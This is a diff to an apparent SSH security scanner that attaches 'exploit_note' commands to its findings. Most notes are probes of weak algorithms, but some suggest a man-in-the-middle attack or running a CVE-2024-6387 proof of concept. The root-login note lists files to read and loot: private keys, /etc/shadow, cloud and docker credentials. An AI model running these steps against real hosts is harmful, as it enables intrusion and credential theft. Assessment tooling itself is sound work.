@@ -605,7 +605,13 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     "openssh",
                     f"ssh -1 -oProtocol=1 -p {p.portid} {h.ip}",
                     "Disable SSH-1 entirely (Protocol 2 only in sshd_config).",
-                    ["CWE-327"], kind="ssh_legacy_proto"))
+                    ["CWE-327"], kind="ssh_legacy_proto",
+                    exploit_note=(
+                        "ssh -1 -oProtocol=1 -oStrictHostKeyChecking=no "
+                        "-p <port> nobody@<ip>  # if it negotiates, capture "
+                        "with tcpdump and try CRC32-compensation MitM "
+                        "(Ettercap ssh1 plugin, still in the tree)."),
+                    depth_tier="t1"))
 
             # --- banner distro tag leak (low, informational) -----------------
             if comment:
@@ -637,7 +643,14 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     "Upgrade to OpenSSH 9.8p1 or newer, or apply the "
                     "distribution's backported fix; set LoginGraceTime 0 "
                     "as an interim mitigation.",
-                    ["CWE-364", "CWE-362"], kind="ssh_known_bad_build"))
+                    ["CWE-364", "CWE-362"], kind="ssh_known_bad_build",
+                    exploit_note=(
+                        "python3 CVE-2024-6387_PoC/hikvision_exploit.py "
+                        "<ip> <port>  # burl.io/qualys-cve-2024-6387 - only "
+                        "against lab targets; the exploit crashes sshd "
+                        "children by design and can wedge the host under "
+                        "load."),
+                    depth_tier="t0"))
 
             # --- KEXINIT-derived posture -----------------------------------
             kex = pr.get("kex") or []
@@ -671,7 +684,12 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     "openssh", f"ssh -oKexAlgorithms={weak_k[0]} -p {p.portid} {h.ip}",
                     "Remove weak KEX methods from sshd_config KexAlgorithms; "
                     "prefer curve25519-sha256 and diffie-hellman-group16-sha512+.",
-                    ["CWE-326", "CWE-327"], kind="ssh_weak_kex"))
+                    ["CWE-326", "CWE-327"], kind="ssh_weak_kex",
+                    exploit_note=(
+                        "ssh -oKexAlgorithms=diffie-hellman-group1-sha1 "
+                        "-oHostKeyAlgorithms=+ssh-rsa -vv -p <port> "
+                        "nobody@<ip> 2>&1 | grep 'kex: algorithm'"),
+                    depth_tier="t1"))
 
             # Weak ciphers (union of s->c and c->s to cover asymmetric offers).
             weak_c = sorted({c for c in cipher_sc + cipher_cs
@@ -693,7 +711,12 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     "openssh", f"ssh -c {weak_c[0]} -p {p.portid} {h.ip}",
                     "Restrict Ciphers in sshd_config to aes*-gcm@openssh.com, "
                     "chacha20-poly1305@openssh.com, and aes*-ctr only.",
-                    ["CWE-327"], kind="ssh_weak_cipher"))
+                    ["CWE-327"], kind="ssh_weak_cipher",
+                    exploit_note=(
+                        "ssh -c 3des-cbc -oHostKeyAlgorithms=+ssh-rsa -vv "
+                        "-p <port> nobody@<ip>; if it reaches userauth, CBC "
+                        "is really wired."),
+                    depth_tier="t1"))
 
             # Weak MACs.
             weak_m = sorted({m for m in mac_sc + mac_cs
@@ -727,7 +750,12 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     "Remove ssh-rsa and ssh-dss from HostKeyAlgorithms in "
                     "sshd_config; issue new ed25519 host keys and rely on "
                     "rsa-sha2-256/512 for legacy clients.",
-                    ["CWE-327"], kind="ssh_hostkey_posture"))
+                    ["CWE-327"], kind="ssh_hostkey_posture",
+                    exploit_note=(
+                        "ssh-keyscan -t rsa,dsa -p <port> <ip> | "
+                        "ssh-keygen -lf -   # confirms the algorithm is "
+                        "really held"),
+                    depth_tier="t1"))
 
             # Terrapin.
             terr, terr_hits = _terrapin_applies(kex, cipher_sc, mac_sc)
@@ -745,7 +773,13 @@ def findings(hosts: list[Host], probes: dict | None = None,
                     "Upgrade to OpenSSH 9.6+ (or the vendor patch that adds "
                     "kex-strict); as a stopgap, disable chacha20-poly1305@ "
                     "openssh.com and every -cbc cipher.",
-                    ["CWE-354"], kind="ssh_terrapin"))
+                    ["CWE-354"], kind="ssh_terrapin",
+                    exploit_note=(
+                        "git clone https://github.com/RUB-NDS/"
+                        "Terrapin-Scanner && ./Terrapin-Scanner -connect "
+                        "<ip>:<port>   # or the python one-shot "
+                        "terrapin_scanner --host <ip> --port <port>"),
+                    depth_tier="t1"))
 
             # Hostkey fingerprint capture (info-level; correlator).
             hk = pr.get("hostkey_capture")
@@ -802,7 +836,13 @@ def findings(hosts: list[Host], probes: dict | None = None,
                         "Set PermitRootLogin no (or prohibit-password with "
                         "hardware-token-backed keys); force admin work through "
                         "an unprivileged account + sudo.",
-                        ["CWE-250"], kind="ssh_root_login"))
+                        ["CWE-250"], kind="ssh_root_login",
+                        exploit_note=(
+                            "ssh -oPreferredAuthentications=password -p "
+                            "<port> root@<ip>; on shell: cat /root/.ssh/id_* "
+                            "/root/.ssh/known_hosts /etc/shadow, then loot "
+                            "~/.aws ~/.docker/config.json /root/.gnupg."),
+                        depth_tier="t1"))
     return out
 
 
